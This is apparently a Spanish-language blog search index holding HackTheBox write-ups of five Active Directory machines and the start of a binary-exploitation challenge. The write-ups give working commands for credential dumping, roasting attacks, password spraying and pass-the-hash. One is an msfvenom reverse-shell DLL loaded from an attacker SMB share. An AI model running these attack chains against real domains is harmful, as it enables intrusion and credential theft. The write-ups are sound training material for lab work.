[ { "title": "Resolute - Write Up (HTB) ❤", "url": "/posts/Resolute-HackTheBox-Machine/", "categories": "HackTheBox, Active Directory", "tags": "Abusing DNSAdmins Group, Active Directory, Null Session via RPC, Password Spraying, Password exposed via RPC, Windows", "date": "2023-10-16 00:00:00 -0300", "snippet": "Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Resolute de HackTheBox.Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de identificar potenciales vías de ataque.Como podrán ver a continuación, se específica el parámetro -sS con el objetivo de que el escaneo sea vía TCP SYNC, lo que de cierto modo me permitirá agilizarlo, debido a que no hay Three-Way-HandShake como en TCP.Lo otro es que se configura el --min-rate en 3000 con la idea de no enviar una cantidad menor a 3000 paquetes por segundo.Advertencia: No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de HackTheBox.nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.169 -oG tcp_ports.txtEn el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio Kerberos, podemos deducir que estamos ante un entorno de Active Directory. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.nmap -v -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49714,49839 10.10.10.169 -oN port_scan.txtUno de los primeros problemas de seguridad que identificamos al enumerar la máquina, es que te puedes autenticar sobre el servicio LDAP sin necesidad de una contraseña, pudiendo listar información sensible del dominio, tal como usuarios, propiedades de objetos, etc.ldapsearch -H ldap://10.10.10.169 -w &#39;&#39; -x -b &#39;DC=megabank,DC=local&#39;De la misma forma, esto ocurre con WinRPC, donde nos podemos autenticarnos con el null session y listar a todos los usuarios del dominio.rpcclient -N -U &#39;&#39; megabank.localAl listar las descripciones de cada usuario, identificamos que en la del usuario marko hay una contraseña Welcome123!.Teniendo una contraseña potencialmente válida, realizamos un Password Sprying donde identificamos que esta la pertenece al usuario melanie.Al validar la credencial sobre el servicio WinRM, descubrimos que el usuario melanie forma parte del grupo Remote Management Users, por lo que podemos obtener acceso directo hacía una consola en el servidor con la herramienta evil-winrm.Habiendo obtenido acceso al servidor, identificamos la carpeta PSTranscripts, la cual no forma parte del listado común de directorios en la raíz de los sistemas operativos Windows.Al revisar dicho directorio, se identifica otro directorio dentro de este, el cual posee un archivo de texto.Al revisar dicho archivo, se identifican comandos de consola, los cuales muestran intentos de autenticación sobre un recurso de red, con la contraseña del usuario ryan.Esta contraseña es validada con crackmapexec, herramienta con la cual validamos que el usuario ryan también pertenece al grupo Remote Management Users.Posterior a esto, antes de autenticarnos con el usuario ryan, lanzamos la herramienta SharpHound.exe, con el objetivo de listar potenciales vectores de ataque que puedan existir entre las relaciones establecidas entre los distintos objetos que componen al AD.cmd /c SharpHound.exe --CollectionMethods AllAnalizando el esquema de relación, detectamos que el usuario forma parte del grupo Contractors, el cual a su vez pertenece al grupo privilegiado, DnsAdmins.En este punto, hemos encontrado el vector de escalada de privilegios, debido a que el grupo DnsAdmins forma parte de los objetos críticos del directorio activo. Esto significa que, un usuario que forma parte de este, tiene la capacidad de controlar la totalidad del servicio, incluida las DLLs que se ejecutan en contexto privilegiado.Por lo tanto, dado que tenemos control total del servicio, podemos crear una DLL maliciosa con la herramienta MSFvenom, la cual está compilada para enviarnos una reverse shell a nuestra máquina, al puerto 443 en escucha.Es importante destacar que esta DLL, sobre la cual tenemos control, se ejecuta en un contexto de máximos privilegios en el servidor.msfvenom -a x64 -p windows/x64/shell_reverse_tcp -e x64/xor LHOST=10.10.17.210 LPORT=443 -f dll -o dnsadmin_priv.dllPosterior a esto, con la herramienta dnscmd.exe, la cual es utilizada para administrar el DNS, añadimos la DLL como un plugin del servicio.Cabe destacar que la DLL se encuentra servida en una carpeta compartida por SMB, en nuestro servidor atacante.dnscmd.exe RESOLUTE /config /serverlevelplugindll \\\\10.10.17.210\\smb\\dnsadmin_priv.dllComo se observó en la imagen anterior, la configuración es aplicada exitosamente.En base a esto, se reinicia el servidor DNS, lo cual provoca que automáticamente se invoque y ejecute nuestra DLL, a través del servicio SMB.Habiéndose ejecutado, recibimos con éxito la reverse shell de NT Authority\\System, en el puerto en escucha de nuestra máquina. De esta manera, logramos control total del Domain Controller.Referencias DNSAdmin to DC compromise in one line (by Shay Ber): https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 dnscmd (Microsoft Learn): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd DnsAdmins to DomainAdmin: https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" }, { "title": "Blackfield - Write Up (HTB) ❤", "url": "/posts/Blackfield-HackTheBox-Machine/", "categories": "HackTheBox, Active Directory", "tags": "AS-REP Roasting, Abusing Backup Operators, Abusing ForceChangePassword, Active Directory, Dumping LSASS through a dump file (Pypykatz)", "date": "2023-10-09 00:00:00 -0300", "snippet": "Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Blackfield de HackTheBox.Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de identificar potenciales vías de ataque.Como podrán ver a continuación, se específica el parámetro -sS con el objetivo de que el escaneo sea vía TCP SYNC, lo que de cierto modo me permitirá agilizarlo, debido a que no hay Three-Way-HandShake como en TCP.Lo otro es que se configura el --min-rate en 3000 con la idea de no enviar una cantidad menor a 3000 paquetes por segundo.Advertencia: No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de HackTheBox.nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.192 -oG tcp_ports.txtEn el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio Kerberos, podemos deducir que estamos ante un entorno de Active Directory. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.nmap -v -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN scan_ports.txtPosterior a esto, enumeramos los recursos compartidos a través el servicio SMB, aprovechando el null session.crackmapexec smb blackfield.local -u &#39;null&#39; -p &#39;&#39; --sharesComo se puede ver en imagen, sobre el recurso $IPC directamente no encontramos archivos o directorios importantes.Sin embargo, en el recurso profiles$ identificamos un listado extenso de carpetas con nombres de usuarios.Dado que estamos ante un entorno AD, agarramos todos los nombres de usuarios y, con la herramienta kerbrute validamos si efectivamente estos se encuentran registrados en el dominio.Una vez identificados los usuarios del dominio, lanzamos un ASREP-Roasting Attack con el cual logramos solicitar el Ticket Granting Ticket (TGT) del usuario support, debido a que este tiene habilitado el privilegio UF_DONT_REQUIRE_PREAUTH.impacket-GetNPUsers -no-pass -usersfile domain_users.txt blackfield.local/Posterior a ello, teniendo en cuenta que el TGT se encuentra cifrado con la contraseña del usuario, y haciendo uso de la herramienta john, logramos crackear dicho hash exitosamente.Considerando que tenemos a más de un usuario en mano, lanzamos un Password Sprying con el objetivo de verificar que si la contraseña pertenece a más de un usuario en el dominio.crackmapexec smb blackfield.local -u domain_users.txt -p &#39;#00^BlackKnight&#39; --continue-on-successEn este caso, al lanzar el ataque, validamos que dicha contraseña pertenece al usuario support, únicamente.Como se puede observar en imagen, también verificamos que la contraseña del usuario es válida sólo sobre el servicio SMB.En este caso no lo es sobre WinRM, debido a que support no es parte del grupo Remote Management Users.Como se observa en la imagen, al enumerar los recursos compartidos con las credenciales del usuario support logramos identificar que este tiene privilegios de lectura sobre el NETLOGON y el SYSVOL.Al acceder al NETLOGON no se encuentran directorios ni archivos. Sin embargo, en el SYSVOL si, lo cual nos podría permitir obtener credenciales a través del archivo Groups.xml del Group Policy.Para esto, hacemos una montura sobre nuestro sistema del recurso SYSVOL, sin embargo, posterior a esto no encontramos el archivo Groups.xml.Dado que en el servicio SMB no existen archivos de completo interés, lanzamos la herramienta BloodHound-Python con la cual, enumeramos ampliamente la estructura de permisos y accesos configurados en el directorio activo.Al analizar el resultado obtenido observamos que el usuario support tiene el permiso ForceChangePassword sobre el usuario audit2020, lo cual significa que support le puede cambiar la contraseña a audit2020.Para ejecutar dicha acción desde Linux, hacemos uso de la herramienta net rpc, con la cual logramos cambiarle la contraseña al usuario exitosamente.net rpc password &quot;audit2020&quot; &quot;Admin12345$&quot; -U &quot;Blackfield.Local&quot;/&quot;support&quot;%&quot;#00^BlackKnight&quot; -S &quot;10.10.10.192Al enumerar los recursos compartidos, sobre los cuales tiene acceso audit2020, podemos ver que puede leer el contenido de forensic.En forensic se identifican tres directorios, los cuales parecen ser el resultado de un análisis forense ejecutado sobre el servidor.En la carpeta memory_analysis, donde están los resultados de lo que debió ser el resultado de un análisis de la memoria en tiempo de ejecución, se identifica un comprimido interesante que corresponde al lsass.zip.En principio esto es interesante, ya que el Local Security Authority SubSystem (LSASS) es un proceso que contiene a todos los Security Service Providers (SSP), los cuales son paquetes encargados específicamente de gestionar distintos de procesos de autenticación en el entorno.Dependiendo del caso, el SSP que gestione la autenticación almacenará la contraseña del usuario y le permitirá no tener que autenticarse cada vez que necesite acceder al servicio, por le menos en un corto periodo de tiempo.Dado esto, descargamos el comprimido lsass.zip en nuestro equipo local.Al descomprimir dicho archivo, obtenemos un archivo de extensión dmp, lo cual corresponde a un fichero de volcado de memoria.Para poder volcar el contenido de este archivo, en texto claro, usamos la herramienta pypykatz, utilizando el modo de volcado del LSA.pypykatz lsa minidump lsass.DMPHabiendo hecho esto, logramos obtener el hash NT de svc_backup, el cual nos permite autenticarnos en el servidor a través del servicio WinRM, debido a que dicho usuario forma parte del grupo Remote Management Users.Al listar los grupos en los que está el usuario svc_backup vemos que pertenece a Backup Operators.Por consecuencia también tiene habilitado el privilegio SeBackupPrivilege.Un usuario perteneciente a dicho grupo puede crear una copia de seguridad del sistema de archivos, o restaurar ficheros, a pesar de las medidas de seguridad que se encuentren implementadas en el servidor.Considerando esto, podríamos pensar fácilmente en volcar la SAM, sin embargo, esto sólo aplica para un entorno local de Windows, en el que el equipo no está conectado a un directorio activo.Para el caso AD, tenemos que usar diskshadow y crear un snapshot del sistema de archivos en otra partición del disco. En este caso los comandos se listan en un archivo de texto debido a que, con el parámetro /s estos serán ejecutados de igual forma, sin necesidad de acceder a la consola interactiva.Como podemos ver en imagen, los comandos de diskshadow se ejecutan sin errores, por lo que la copia del sistema de archivos es realizada exitosamente.Estando hecho el backup, utilizamos la herramienta robocopy para hacer una copia exacta del NTDS.dit, almacenado en la partición E:, hacía una ruta del servidor que se encuentre bajo nuestro control.Teniendo el NTDS.dit y, habiendo hecho lo mismo con el SYSTEM, tenemos todo para volcar los hashes NTLM de todos los usuarios del dominio.Como se muestra en la imagen, en este caso ejecutamos el siguiente comandos usando impacket-secretsdump, pasando como parámetros tanto el NTDS.dit como el SYSTEM, con lo que logramos volcar todos los hashes NTLM de los usuarios.impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCALHabiendo hecho esto, podemos usar el hash NTLM del usuario Administrator para autenticarnos en el servidor mediante WinRM y lograr el control total del Domain Controller.Referencias Extract credentials from lsass remotely: https://en.hackndo.com/remote-lsass-dump-passwords/ Privileged Groups (Hacktricks): https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges Windows Authentication Architecture (Microsoft Learn): https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-architecture Credential Dumping: Local Security Authority (LSA/LSASS.EXE): https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/ What is Backup Operators (WindowsTechno): https://windowstechno.com/what-is-backup-operators/ Copy / Xcopy / Robocopy: Which Is Better for Me? (EaseUS): https://www.easeus.com/knowledge-center/copy-vs-xcopy-vs-robocopy.html" }, { "title": "Active - Write Up (HTB) ❤", "url": "/posts/Active-HackTheBox-Machine/", "categories": "HackTheBox, Active Directory", "tags": "Active Directory, Kerberoasting, Decrypting cpassword (Groups.xml), Windows", "date": "2023-10-05 00:00:00 -0300", "snippet": "Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Active de HackTheBox.Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de identificar potenciales vías de ataque.Como podrán ver a continuación, se específica el parámetro -sS con el objetivo de que el escaneo sea vía TCP SYNC, lo que de cierto modo me permitirá agilizarlo, debido a que no hay Three-Way-HandShake como en TCP.Lo otro es que se configura el --min-rate en 3000 con la idea de no enviar una cantidad menor a 3000 paquetes por segundo.Advertencia: No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de HackTheBox.nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.100 -oG tcp_ports.txtEn el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio Kerberos, podemos deducir que estamos ante un entorno de Active Directory. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.nmap -v -sCV -p53,135,139,389,445,464,593,636,3268,3269,5722,49152,49153,49158,49169,49171 10.10.10.100 -oN scan_ports.tAl enumerar el servicio SMB, detectamos que este posee habilitado el null session, lo que nos da la posibilidad de acceder y recopilar información importante que se almacene en los recursos compartidos.En este caso, al primer recurso compartido que accedemos es a Replication donde identificamos que contiene un directorio con el nombre del dominio, de manera similar a lo que comúnmente se encuentra en SYSVOL.Esto es importante, ya que si esta carpeta compartida es lo mismo que el SYSVOL, significa que existe una alta posibilidad de que podamos acceder a la directiva de grupo del directorio activo.El SYSVOL es un recurso compartido en Active Directory sobre el cual, por defecto, todo los usuarios tienen acceso de lectura. Este recurso se encuentra sincronizado con el Domain Controller y almacena distintas cosas entre estas: logon scripts, información de políticas de grupo y otros datos que deben estar disponibles en todo momento para el Domain Controller.La política de grupo (también conocida como Group Policy) es una tecnología en Windows Server que permite administrar la configuración de usuarios y computadoras en un entorno de directorio activo.Como se muestra en la siguiente imagen, validamos correctamente que esta carpeta nos permite acceder al contenido del Group Policy, en el cual identificamos una cpassword configurada para el usuario SVC_TGS, mediante el archivo Groups.xml.Esto como tal, representa un problema de seguridad, debido a que la clave de cifrado del cpassword fue revelada por Microsoft hace unos años atrás, lo cual le permitió que cualquier tipo de usuario con acceso al SYSVOL, leyera dicha clave y descifrara el valor real de la contraseña.Para obtener la contraseña utilizamos la herramienta gpp-decrypt la cual hace uso de esta clave revelada por Microsoft para descifrar el valor de las cpasswords.Como se puede ver en imagen, la clave es descifrada correctamente.En base a esto, teniendo credenciales válidas en el directorio activo, lanzamos un Kerberoasting Attack con la herramienta impacket-GetUserSPNs la cual nos permite solicitar un Ticket Granting Servicd (TGS).Para dar contexto, el Kerberoasting es un ataque que consiste en solicitar un Ticket Granting Service (TGS) de un usuario en un entorno de Active Directory que cuenta con autorización en uno o varios servicios (que comúnmente se les referencia por el atributo Service Principal Name (SPN)). Es importante mencionar que quien solicita dicho ticket, debe de ser un usuario autenticado en el directorio activo.En este caso, con GetUserSPNs listamos y solicitamos los Ticket Granting Service de los usuarios kerberoastables, donde logramos ver que el usuario Administrator es uno de ellos. Por lo que el ticket obtenido es el del usuario con máximos privilegios en el directorio activo.impacket-GetUserSPNs &#39;active.htb/SVC_TGS:GPPstillStandingStrong2k18&#39; -requestUna vez obtenido el TGS del usuario Administrator, lo almacenamos en un archivo svc_tgs-tgs.crack y ejecutamos un ataque de fuerza bruta local utilizando la herramienta john, con el objetivo de crackearlo.Como se puede ver en imagen, dicho objetivo es logrado por lo que obtenemos la contraseña del usuario Administrator.Ya con la contraseña del usuario Administrator verificamos que está es válida sobre el servicio SMB, por lo cual podemos autenticarlo directamente en el servidor.En este caso, a través del siguiente comando con la herramienta impacket-psexec logramos autenticar al usuario con éxito en el servidor, obteniendo una terminal de máximos privilegios como NT Authority\\System.impacket-psexec &#39;active.htb/Administrator:Ticketmaster1968@10.10.10.100&#39;Referencias Exploiting GPP SYSVOL (Groups.xml): https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/ Kerberoasting Attacks: https://www.crowdstrike.com/cybersecurity-101/kerberoasting/ Kerberoasting: https://en.hackndo.com/kerberoasting/" }, { "title": "Sauna - Write Up (HTB) ❤", "url": "/posts/Sauna-HackTheBox-Machine/", "categories": "HackTheBox, Active Directory", "tags": "Active Directory, AS-REP Roasting, Abusing DCSync, Pass-the-hash (PtH), Windows", "date": "2023-10-01 00:00:00 -0300", "snippet": "Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Sauna de HackTheBox.Como en cada write-up, lo primero hacemos es lanzar un escaneo de puertos con nmap con el objetivo de identificar potenciales vías de ataque.Como podrán ver a continuación, se específica el parámetro -sS con el objetivo de que el escaneo sea vía TCP SYNC, lo que de cierto modo me permitirá agilizarlo, debido a que no hay Three-Way-HandShake como en TCP.Lo otro es que se configura el --min-rate en 3000 con la idea de no enviar una cantidad menor a 3000 paquetes por segundo.Advertencia: No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de HackTheBox.nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.175 -oG tcp_ports.txtEn el resultado del escaneo, se identifican varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio Kerberos, podemos deducir que estamos ante un entorno de Active Directory. Por lo que ya podemos saber más o menos cómo enforcar nuestra estrategia de ataque y enumeración.nmap -v -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 10.10.10.175 -v port_scan.txtUna vez entendemos a rasgos generales, ante qué nos enfrentamos, revisamos la aplicación web que se encuentra corriendo en el puerto 80/http.En dicho servicio existe un landing page, en el endpoint about.html donde se listan los nombres y apellidos de los miembros del equipo.En base a esto, creamos el siguiente diccionario con potenciales nombres de usuarios que se encuentran registrados en el dominio.Hecho esto, con la herramienta kerbrute validamos si es que alguno de estos usuarios se encuentra registrado en el dominio.kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txtComo se muestra en la imagen, la herramienta kerbrute permite identificar al usuario FSmith registrado en el dominio.Teniendo dicho nombre de usuario, ejecutamos un ataque AS-REPRoasting con la herramienta impacket-GetNPUsers.En la imagen a continuación, se puede cómo es posible solicitar el Ticket Granting Ticket (TGT) del usuario, enviando una solicitud KRB_AS_REQ al Key Distribution Center (KDC) de Kerberos. Este servicio responde correctamente al atacante con un mensaje KRB_AS_REP, cual contiene el TGT.Esto ocurre debido a que la cuenta del usuario tiene configurado el privilegio UF_DONT_REQUIRE_PREAUTH, lo cual permite solicitar el TGT sin previa autenticación.impacket-GetNPUsers -no-pass -usersfile user.txt egotistical-bank.local/Como mencionamos en el post anterior, es posible crackear un Ticket Granting Ticket debido a que parte de este se encuentra cifrado con la contraseña del usuario.Probando un ataque de fuerza bruta con la herramienta john, logramos obtener la contraseña del usuario FSmith.Como se muestra a continuación, dicha credencial es validada con crackmapexec sobre el servicio WinRM, con lo cual comprobamos que el usuario pertenece al grupo Remote Management Users. Esto significa que dicho usuario se puede conectar a la terminal del servidor y ejecutar comandos.Para aprovecharnos de dicho grupo utilizamos la herramienta evil-winrm, la cual nos permite emular el comportamiento de una terminal PowerShell y acceder al servidor de manera directa.Enumerando a los usuarios del dominio, identificamos a svc_loanmgr.Dado esto, revisando las credenciales almacenadas en el Winlogon se identifica una contraseña por defecto.reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;Esta contraseña es probada sobre el servicio SMB con el usuario svc_loanmgr la cual resulta ser valida.crackmapexec smb &#39;egotistical-bank.local&#39; -u &#39;svc_loanmgr&#39; -p &#39;Moneymakestheworldgoround!&#39;Posterior a esto, lanzamos la herramienta bloodhound-python con el objetivo de enumerar gran parte de los privilegios y configuraciones habilitadas entre los objetos del Active Directory.bloodhound-python -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39; -d egotistical-bank.local -ns 10.10.10.175 -c allRecopilando información sobre los privilegios de cada cuenta, identificamos que el usuario svc_loanmgr tiene capacidad DCSync sobre el dominio, lo cual significa que este puede solicitar los hashes NTLM de los usuarios.Sabiendo esto, con la herramienta impacket-secretsdump solicitamos los hashes NTLM de los usuarios del dominio, a partir de las credenciales de svc_loanmgr.impacket-secretsdump &#39;egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&#39;Posterior a esto, tenemos dos alternativas: Ejecutar un Pass-the-hash attack y engañar al sistema de autenticación con la herramienta impacket-psexec, o wmiexec. Abusar de WinRM con la herramienta evil-winrm y conectarnos directamente a una terminal del servidor. Ambas opciones son válidas para obtener una terminal con el usuario Administrator.En este caso, el primero que probamos es el Pass-the-hash, con la herramienta impacket-psexec, el cual funciona exitosamente como se muestra en imagen.impacket-psexec -hashes &#39;:823452073d75b9d1cf70ebdf86c7f98e&#39; &#39;egotistical-bank.local/Administrator@10.10.10.175&#39;La segunda opción de igual forma funciona y permite obtener control total del servidor.evil-winrm -i egotistical-bank.local -u &#39;Administrator&#39; -H &#39;823452073d75b9d1cf70ebdf86c7f98e&#39;" }, { "title": "Forest - Write Up (HTB) ❤", "url": "/posts/Forest-HackTheBox-Machine/", "categories": "HackTheBox, Active Directory", "tags": "Active Directory, AS-REP Roasting, Abusing Account Operators, Abusing DCSync, Abusing Exchange Windows Permissions, Abusing WriteAcl Permissions, User Enum via RPC, Windows", "date": "2023-09-27 00:00:00 -0300", "snippet": "Buenas a tod@s, el día de hoy les traigo un write-up de la máquina Forest de HackTheBox.Como en cada write-up, lo primero hago es lanzar un escaneo de puertos con nmap con el objetivo de identificar potenciales vías de ataque.Como podrán ver a continuación, específico el parámetro -sS con el objetivo de que el escaneo sea vía TCP SYNC, lo que de cierto modo me permitirá agilizarlo, debido a que no hay Three-Way-HandShake como en TCP.Lo otro es que configuré el --min-rate en 3000 con la idea de no enviar una cantidad menor a 3000 paquetes por segundo.Advertencia: No aconsejo lanzar este escaneo en entornos productivos debido a que es ultra ruidoso y agresivo. En este caso lo estoy lanzando en un entorno controlado de HTB, donde no hay problema si un servicio se llega a caer.nmap -v -sS --min-rate 3000 -n -Pn -p- 10.10.10.161 -oG tcp_ports.txtPosterior a ello, nuevamente utilizando nmap, lanzo un escaneo de enumeración a todos los puertos abiertos con el objetivo de identificar detalles más específicos acerca de los servicios que se encuentran corriendo.En base al resultado obtenido, tendré mucho más contexto para saber bien por dónde atacar y/o probar cosas.map -v -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49969 10.10.10.161 -oN port_scan.txtEn el resultado del escaneo, identifico varios servicios de interés, entre ellos: WinRPC, SMB, LDAP, WinRM y Kerberos. Sin embargo, ya con sólo ver al servicio Kerberos, tengo claro de que estoy ante un entorno de Active Directory, por lo que ya sé más o menos cómo enforcar mi estrategia de ataque y enumeración.Al realizar una prueba sobre el servicio WinRPC, detectó que este posee habilitado el null session, lo que me da la posibilidad de acceder y recopilar información importante del dominio.En este caso, ejecutando el siguiente one-liner extraigo a todos los usuarios listados en WinRPC, con la herramienta rpcclient.rpcclient -N -U &#39;&#39; 10.10.10.161 -c &#39;enumdomusers&#39; | grep -oP &#39;\\[.*?\\]&#39; | grep -v &#39;0x&#39; | tr -d &#39;][&#39;Posterior a esto, con la herramienta kerbrute puedo verificar si estos usuarios son realmente válidos y se encuentran registrados en el dominio.kerbrute userenum --dc 10.10.10.161 -d htb.local users.txtSabiendo esto, con el listado de usuarios en mano, ejecuto un ataque AS-REPRoasting, donde se identificó que el usuario svc-alfresco tiene habilitado el privilegio UF_DONT_REQUIRE_PREAUTH.Este privilegio permite efectuar una solicitud del tipo KRB_AS_REQ al servicio Kerberos, sin previa autenticación del usuario, la cual es respondida con KRB_AS_REP. Esta respuesta como tal, entrega el Ticket Granting Ticket (TGT) del usuario, el cual posteriormente puede ser crackeado. De ahí surge el nombre del ataque.En este caso, logramos identificar que el ataque se efectúa exitosamente sobre el usuario svc-alfresco.impacket-GetNPUsers -no-pass -usersfile users.txt htb.local/Un atacante puede obtener la contraseña de un usuario crackeando un Ticket Granting Ticket (TGT), debido a que parte de este se encuentra cifrado con la misma contraseña.En base a esto, crackeo el TGT obtenido, lo cual me permite tener credenciales en el entorno y hacer pruebas con ello.Una vez obtenidas las credenciales, utilizando crackmapexec, valido que el usuario svc-alfresco es parte del grupo Remote Management Users lo cual me permite conectarme y ejecutar comandos en el servidor, a través del servicio WinRM.crackmapexec winrm 10.10.10.161 -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39;Como se muestra en imagen, con la herramienta evil-winrm logro acceder correctamente a la terminal del usuario svc-alfesco, mediante WinRM.evil-winrm -i 10.10.10.161 -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39;Posterior a esto, ejecuto la herramienta bloodhound-python con la cual enumero gran parte de la configuración existente en el directorio activo, a partir de las credenciales obtenidas.bloodhound-python -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39; -d htb.local --auth-method ntlm -ns 10.10.10.161 -c allComo se observa en la imagen, el usuario svc-alfresco pertenece al grupo Service Accounts, el cual es miembro del grupo Privileged IT Accounts, el que a su vez es miembro del grupo Account Operators.El grupo Account Operators tiene dos cualidades particulares de las cuales me puedo aprovechar como atacante: Puede crear y administrar cuentas de usuarios y grupos no administradores en el dominio. Pueden iniciar sesión en el Domain Controller (DC) localmente.Dado que el usuario svc-alfresco forma parte de Account Operators, significa que tengo la capacidad de gestionar cuentas y grupos en el dominio.Para ello, previamente, listo todos los grupos que puedan ser de utilidad para posteriormente escalar privilegios.Entre estos identificó a Exchange Windows Permissions, el cual corresponde a un grupo de Active Directory que, de manera predeterminada posee habilitado el permiso WriteDACL, lo cual me permitiría asignar ciertos permisos al resto de usuarios en el dominio, entre ellos DCSync. “DCSync es una técnica que se utiliza para pedir las claves de cualquier usuario a un controlador de dominio, a través del protocolo de replicación DRSUAPI.” - TarlogicPor lo general, en entornos de AD donde se encuentra se instalado Microsoft Exchange, suelen haber una cantidad mayor de usuarios en el grupo Exchange Windows Permissions.Sabiendo esto, creo la cuenta de usuario sha16 en el dominio y la añado al grupo local Remote Management Users, con el objetivo de que este puede acceder al servidor mediante el servicio WinRM.Por otro lado, también añado al usuario al grupo del dominio, Exchange Windows Permissions, el cual tiene la capacidad WriteDacl, lo cual me permitiría escalar privilegios, mediante la asignación de permisos críticos.Para dar contexto, las DACL son las Dictionary Access Control List con las cuales es posible gestionar de manera efectiva los accesos en los entornos de directorio activo.Como se muestra en imagen, dicho grupo posee el permisos WriteDacl sobre el dominio.Dado esto, con la siguiente instrucción en PowerShell, habiendo importado PowerView previamente, asigno el permiso DCSync a la cuenta del usuario sha16.# Add-DomainObjectAcl = Add-ObjectAclAdd-ObjectAcl -PrincipalIdentity sha16 -Domain htb.local -Rights DCSyncHecho esto, como se muestra en imagen, el usuario sha16 tiene la capacidad de volcar todo el NTDS, pudiendo obtener todos los hashes NTLM de los usuarios del dominio.impacket-secretsdump &#39;htb.local/sha16:Admin12345$@10.10.10.161&#39;Ya con el hash NTLM del usuario Administrador, me puedo conectar a su cuenta a través del servicio WinRM y obtener una terminal interactiva directamente en el servidor." }, { "title": "HTB-Console - Pwn Challenge (HTB) ❤", "url": "/posts/HTB-Console-HackTheBox-Pwn/", "categories": "linux, binary exploitation, htb", "tags": "linux, pwn, htb, 64-bit", "date": "2023-09-23 00:00:00 -0300", "snippet": "Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.Este es un reto de pwning, del tipo ret2system, similar al ret2libc, el cual implica explotar un Buffer Overflow con el objetivo de evadir la protección no-execute (NX) mediante la ejecución de un ROP Attack, el cual nos permitirá aprovechar las funciones que utiliza el programa para lograr ejecutar una shell interactiva.Como se puede observar en imagen, la idea del programa es “emular” una consola, común y corriente, la cual posee una cantidad limitada de comandos.Ejecutando el programa con ltrace, logramos identificar el resto de los comandos, les dejaré la función de cada uno para no extenderme demasiado: id: Es lo mismo que el comando id, identifica al usuario que ejecuta la shell. dir: Imprime la “ruta actual” en la que se encuentra el usuario en consola. flag: Despliega un input que le solicita la flag al usuario. hof: Despliega un input que solicita el nombre del usuario. ls: Imprime un listado de “directorios”. date: Imprime el output del comando date.Sabiendo esto, analizaremos el programa un poco más a fondo, aplicando reversing con Ghidra.El binario se encuentra stripped, sin embargo, luego de identificar las funciones y variables principales, se obtuvieron las siguientes piezas de código.En primer lugar, se identifica el código de la función principal (main), la cual, en este caso, sólo se encarga de solicitar el input del usuario, el que es almacenado en una variable de 16 bytes y posteriormente pasado como argumento a la función execute_command.void main(void) { char command [16]; FUN_00401196(); puts(&quot;Welcome HTB Console Version 0.1 Beta.&quot;); do { printf(&quot;&amp;gt;&amp;gt; &quot;); fgets(command,16,stdin); execute_command(command); memset(command,0,16); } while( true );}Haciendo revisión de la función execute_command, esta recibe el parámetro, el cual corresponde al comando del usuario, y define una variable user_flag, de 16 bytes, la cual es usada para recibir el input del usuario cuando este ejecuta el comando flag.void execute_command(char *user_command) { int command_checker; char user_flag [16]; command_checker = strcmp(user_command,&quot;id\\n&quot;); if (command_checker == 0) { puts(&quot;guest(1337) guest(1337) HTB(31337)&quot;); } else { command_checker = strcmp(user_command,&quot;dir\\n&quot;); if (command_checker == 0) { puts(&quot;/home/HTB&quot;); } else { command_checker = strcmp(user_command,&quot;flag\\n&quot;); if (command_checker == 0) { printf(&quot;Enter flag: &quot;); 